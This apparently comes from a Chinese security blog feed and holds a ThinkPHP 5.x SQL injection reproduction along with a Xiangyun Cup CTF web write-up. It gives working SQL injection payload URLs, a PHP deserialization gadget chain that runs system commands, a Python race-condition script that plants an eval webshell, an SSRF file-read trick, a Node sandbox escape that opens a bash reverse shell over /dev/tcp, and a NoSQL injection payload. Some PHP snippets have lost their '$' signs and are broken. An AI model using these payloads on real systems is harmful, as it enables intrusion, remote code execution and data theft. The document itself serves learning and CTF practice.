        <content type="html"><![CDATA[<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong> 。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="环境version"><a href="#环境version" class="headerlink" title="环境version"></a>环境version</h3><p>我在使用PHP7以上的高版本搭建时失败了，改用PHP5.4.45</p><p>Mysql5.7.32</p><h3 id="获取thinkPHP"><a href="#获取thinkPHP" class="headerlink" title="获取thinkPHP"></a>获取thinkPHP</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">composer create-project <span class="token operator">--</span>prefer-dist topthink/think=5<span class="token punctuation">.</span>0<span class="token punctuation">.</span>15 tpdemo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们需要修改composer.json文件的require内容如下：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">"&gt;=5.4.0"</span><span class="token punctuation">,</span>    <span class="token property">"topthink/framework"</span><span class="token operator">:</span> <span class="token string">"5.0.15"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>并且执行</p><p>“<code>composer update“</code></p><h3 id="mysql环境"><a href="#mysql环境" class="headerlink" title="mysql环境"></a>mysql环境</h3><p>执行</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">create database tpdemo;use tpdemo;create table users(    id int primary key auto_increment,    username varchar(50) not null);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改php文件"><a href="#修改php文件" class="headerlink" title="修改php文件"></a>修改php文件</h3><p>修改入口文件***/tpdemo/application/index/controller/Index.php**内容为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span> <span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Update success'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改<strong>application/database.php</strong>文件内容，连接数据库；</p><p>并开启 <strong>application/config.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>Payload</strong>:</p><p>“<code>http://localhost:8888/tpdemo/public/index.php?username[0]=dec&amp;username[1]=updatexml(1,concat(0x7,database(),0x7e),1)&amp;username[2]=1“</code></p><p>在图中位置添加断点</p><p><img src="https://s2.loli.net/2022/03/09/F2HZex1KJ7cWEr8.png" alt="img"></p><p>进入insert方法，步过到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">builder</span><span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>insert</strong>方法所在的<strong>Mysql</strong> 类继承于 <strong>Builder</strong> 类，即上面的 <strong>$this-&gt;builder-&gt;insert()</strong> 最终调用的是 <strong>Builder</strong> 类的 <strong>insert</strong> 方法。我们步入到<strong>Builder</strong> 类的insert方法里：</p><p>可以看到我们输入的<strong>username</strong>参数作为数组被储存在$data中，并且使用<strong>parseData</strong>方法进行处理，而 <strong>parseData</strong> 方法直接将来自用户的数据 <strong>$val</strong> 进行了拼接返回。我们的恶意数据存储在 <strong>$val[1]</strong> 中，虽经过了 <strong>parseKey</strong> 方法处理，但丝毫不受影响，因为该方法只是用来解析处理数据的，并不是清洗数据</p><p><img src="https://s2.loli.net/2022/03/09/wHTAjiLdo7rp12t.png" alt="img"></p><p>我们步入<strong>parseData</strong>进行查看：</p><p><img src="https://s2.loli.net/2022/03/09/a3PYu1IbscQdGl7.png" alt="img"></p><p>因为在我们传入的恶意payload中，**$val<strong>数组的第一个元素是inc，所以在图中switch语句中会匹配到箭头所指的位置，使用</strong>parseKey<strong>方法处理</strong>$val<strong>数组的第二个元素，也就是我们的恶意payload，返回给</strong>$result[$item]**，然后再回到 <strong>Builder</strong> 类的 <strong>insert</strong> 方法，直接通过替换字符串的方式，将 <strong>$data</strong> 填充到 <strong>SQL</strong> 语句中，进而执行，造成 <strong>SQL注入漏洞</strong> 。</p><p><img src="https://s2.loli.net/2022/03/09/Tu26H3nFVDx7Ppf.png" alt="img"></p><p>此时的**$sql<strong>内容为</strong>“INSERT INTO <code>users</code> (<code>username</code>) VALUES (updatexml(1,concat(0x7,database(),0x7e),1)+1) “**</p><p>成功造成sql注入：</p><p><img src="https://s2.loli.net/2022/03/09/qy9rCUFz4n6KvAL.png" alt="img"></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>我们看到在<strong>parseData</strong>方法中，switch结构去匹配**$val<strong>数组的第一个元素，值为</strong>inc<strong>和</strong>dec<strong>的处理行为相似，所以我们传入的</strong>username<strong>数组第一个元素值也可以写成</strong>dec**</p><p>至于为什么<strong>exp</strong>不能使用，实际上， <strong>exp</strong> 的情况早在传入 <strong>insert</strong> 方法前就被 <strong>ThinkPHP</strong> 内置过滤方法给处理了，如果数据中存在 <strong>exp</strong> ，则会被替换成 <strong>exp空格</strong> ，这也是为什么 <strong>ThinkPHP</strong> 官方没有对 <strong>exp</strong> 的情况进行处理的原因了。具体内置过滤方法的代码如下：</p><p>路径：<code>*/tpdemo/thinkphp/library/think/Request.php</code></p><p><img src="https://s2.loli.net/2022/03/09/GZFy6c7PeiqwjXh.png" alt="img"></p><p>如果我们将<strong>EXP</strong>从这个正则中删除，<strong>username</strong>第一个元素传入<strong>exp</strong>也可以造成sql注入</p><hr><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h2 id="漏洞概要-1"><a href="#漏洞概要-1" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseArrayData</strong> 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。漏洞影响版本： <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (非最新的 <strong>5.1.8</strong> 版本也可利用)。</p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h3 id="获取thinkPHP-1"><a href="#获取thinkPHP-1" class="headerlink" title="获取thinkPHP"></a>获取thinkPHP</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">composer create-project topthink/think=5.1.* tp5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">"&gt;=5.6.0"</span><span class="token punctuation">,</span>    <span class="token property">"topthink/framework"</span><span class="token operator">:</span> <span class="token string">"5.1.7"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>执行<code>composer update</code></p><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">create database tpdemo;use tpdemo;create table users(    id int primary key auto_increment,    username varchar(50) not null);insert into users(id,username) values(1,'m1saka');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>在 <strong>config/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>config/app.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。<img src="https://s2.loli.net/2022/03/09/sLno1SrgWYu3QEV.png" alt="img"></p><p><img src="https://s2.loli.net/2022/03/09/JZntxbPiqv7huyW.png" alt="img"></p><h3 id="修改入口文件"><a href="#修改入口文件" class="headerlink" title="修改入口文件"></a>修改入口文件</h3><p>将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span> <span class="token operator">=&gt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span> <span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Update success'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><strong>Payload</strong>:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//localhost:8888/tpdemo/public/index.php?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在图中所示位置下断点：</p><p><img src="https://s2.loli.net/2022/03/09/izjfVJR58aXACZM.png" alt="img"></p><p>浏览器输入payload，我们步入到<strong>Query.php</strong>下的<strong>update</strong>方法， <strong>payload</strong> 数据经过 <strong>ThinkPHP</strong> 内置方法的过滤后（不影响我们的 <strong>payload</strong> ），直接进入了 <strong>Query</strong> 类的 <strong>update</strong> 方法。该方法调用了 <strong>Connection</strong> 类的 <strong>update</strong> 方法，该方法又调用了 <strong>$this-&gt;builder</strong> 的 <strong>insert</strong> 方法，这里的 <strong>$this-&gt;builder</strong> 为 <strong>\think\db\builder\Mysql</strong> 类，该类继承于 <strong>Builder</strong> 类。</p><p>步入Connection.php下的update方法</p><p><img src="https://s2.loli.net/2022/03/09/bpH5lKfwiSZnVsI.png" alt="img"></p><p>可以看到update方法中调用了<strong>parseData</strong>方法，我们继续跟进<strong>parseData</strong>方法，此时我们传入的<strong>username</strong>数组参数作为<strong>parseData</strong>方法的**$data<strong>参数，又赋值给</strong>$val<strong>参数，进入下面的</strong>switch case**语句进行处理。</p><p><img src="https://s2.loli.net/2022/03/09/HiUZ9btSAEcrDzW.png" alt="img"></p><p>会进入<strong>default</strong>中使用<strong>parseArrayData</strong>处理，我们步入到<strong>parseArrayData</strong>中：</p><p><img src="https://s2.loli.net/2022/03/09/yfeIGV79wdqLDOC.png" alt="img"></p><p><strong>$data</strong>是我们传入的参数，所以在此方法中，**$fun $point** 和**$value<strong>都是我们可以控制的，</strong>$result** 相当于 <strong>$a(‘$b($c)’)</strong> 其中 <strong>$a、$b、$c</strong> 均可控。最后形成的 <strong>SQL</strong> 语句如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span>  <span class="token keyword">SET</span> <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token operator">=</span> a<span class="token punctuation">(</span><span class="token string">'b($c)'</span><span class="token punctuation">)</span>  <span class="token keyword">WHERE</span>  <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着我们想办法闭合即可。我们令 <strong>$a = updatexml(1,concat(0x7,user(),0x7e),1)^</strong> 、 <strong>$b = 0</strong> 、 <strong>$c = 1</strong> ，即：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token keyword">SET</span> <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token operator">=</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token string">'0(1)'</span><span class="token punctuation">)</span> <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以造成sql注入。</p><p><img src="https://s2.loli.net/2022/03/09/B2hfocSGR5l8uMe.png" alt="img"></p><p>贴一张mochazz师傅总结的图</p><p><img src="https://s2.loli.net/2022/03/09/s1iJgE65vKnqrNz.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> poc </tag>
            
            <tag> sql注入 </tag>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>祥云杯wp</title>
      <link href="/2021/08/30/xiangyuncup/"/>
      <url>/2021/08/30/xiangyuncup/</url>
      
        <content type="html"><![CDATA[<h1 id="祥云杯web-wp"><a href="#祥云杯web-wp" class="headerlink" title="祥云杯web wp"></a>祥云杯web wp</h1><h2 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h2><p>tc师傅光速找到链接 第四条链子可以用qaq。比赛期间临时把这文章删了可还行。看wm的wp还是人家师傅自己找的tql。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>AppendStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span>  <span class="token class-name-definition class-name">RunProcess</span><span class="token punctuation">{</span>        <span class="token keyword">protected</span> output<span class="token punctuation">;</span>        privateprocesses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            this<span class="token operator">-&gt;</span><span class="token property">processes</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AppendStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>this<span class="token operator">-&gt;</span><span class="token property">output</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jiang'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">default</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token keyword">default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        this<span class="token operator">-&gt;</span><span class="token property">default</span> <span class="token operator">=</span><span class="token keyword">default</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">AppendStream</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> streams <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        privateseekable <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            this<span class="token operator">-&gt;</span><span class="token property">streams</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CachingStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">CachingStream</span><span class="token punctuation">{</span>        privateremoteStream<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            this<span class="token operator">-&gt;</span><span class="token property">remoteStream</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>this<span class="token operator">-&gt;</span><span class="token property">stream</span><span class="token operator">=</span><span class="token keyword">new</span>  <span class="token class-name">PumpStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">PumpStream</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> source<span class="token punctuation">;</span>        privatesize<span class="token operator">=</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> buffer<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>this<span class="token operator">-&gt;</span><span class="token property">buffer</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'j'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"closure/autoload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token function"><span class="token punctuation">\</span>Opis<span class="token punctuation">\</span>Closure<span class="token punctuation">\</span>serialize</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>this<span class="token operator">-&gt;</span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//flag{2d71d2ff-f3d9-495f-b788-3199b60ff2cf}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加个base64就行了</p><h2 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h2><p>buu没有复现环境，在这里讲一下思路：</p><p>很明显是一个ssrf，在爆破的过程中发现报错回显存在file_get_contents，题目还ban了dict file啥的协议掩人耳目qwq（file-get_contents只支持http协议）。各种尝试大概知道后台的过滤函数是先进行判断是否包含”http”，匹配到了再进行传入。然后就想到了一个奇技淫巧可以读源码：</p><pre class="line-numbers language-none"><code class="language-none">fxxk:/http://../../../../../../var/www/html/admin/include123.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>赛后很尴尬的看到有师傅直接扫到了/admin。。。我们刚开始忘了扫是真的憨还好后来扫了一下，存在/admin/include123.php，源码找不到了，去嫖个图贴这吧</p><p><img src="https://s2.loli.net/2022/03/09/sDNyK124batAZTB.png" alt="img"></p><p>这waf写的方式有点亲切。。。awd脚本里嫖来的吧。session条件竞争，贴个脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">Write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">512</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'url'</span><span class="token punctuation">,</span>                  data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'111111111111111111111111111111111111111111111111111111111&lt;?php phpinfo();file_put_contents("/tmp/1","&lt;?php eval(base64_decode(\$_GET[1]));phpinfo();?&gt;");?&gt;'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                  files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'Firebasky.txt'</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                  cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'Firebasky'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>Write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="层层穿透"><a href="#层层穿透" class="headerlink" title="层层穿透"></a>层层穿透</h2><p>比赛的时候环境稀碎 jar传了一万年都没传上。听说进内网用fastjson打的</p><h2 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h2><p>考的是zombie注入漏洞：zombie使用vm库，在解析js和html的时候进行了调用。</p><p>本题的漏洞点在goto的visit上：</p><p><img src="https://s2.loli.net/2022/03/09/naqLzFbjNH1xWKv.png" alt="img"></p><p>我们先进行用户注册，在更新信息界面传一个正常的bucket值并且抓包，因为后台存在302跳转，我们先不放行，然后传入我们在vps构造的包含沙箱逃逸代码的url，放行抓的包，就能进行绕过。但是我们传入的url要满足另一个条件如下图：</p><p><img src="https://s2.loli.net/2022/03/09/oThEq9RkbQaON21.png" alt="img"></p><p>随便在请求url的时候传一个值?a=oss-cn-bejing.ichunqiu.com就能进行绕过。</p><p>我们在服务区上创建一个test.html，包含脚本如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">c<span class="token operator">=</span><span class="token string">'constructor'</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'],); console.log(ls.output.toString());"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问/user/bucket，服务器接收到shell。（记得监听</p><h2 id="PackageManager2021"><a href="#PackageManager2021" class="headerlink" title="PackageManager2021"></a>PackageManager2021</h2><p>上了ts脚本可还行。。。比赛的时候花了一个小时去看了ts的官方文档，啥信息也没搞到。。</p><p>在index.ts文件中，auth路由直接进行了数据库拼接操作，存在nosql注入</p><p><img src="https://s2.loli.net/2022/03/09/Tv2V4lGwZdhbuP3.png" alt="img"></p><p>先注册一个用户，然后在/auth这个路由中传入我们的注入语句。看到天璇的师傅用的盲注，wm的师傅直接用了js的特性语法：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">try</span><span class="token punctuation">{</span>    查询<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>$a<span class="token punctuation">)</span><span class="token punctuation">{</span>    抛出异常<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload如下：</p><pre class="line-numbers language-none"><code class="language-none">e10adc3949ba59abbe56e057f20f883e" || (()=&gt;{throw Error(this.password)})() == "admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
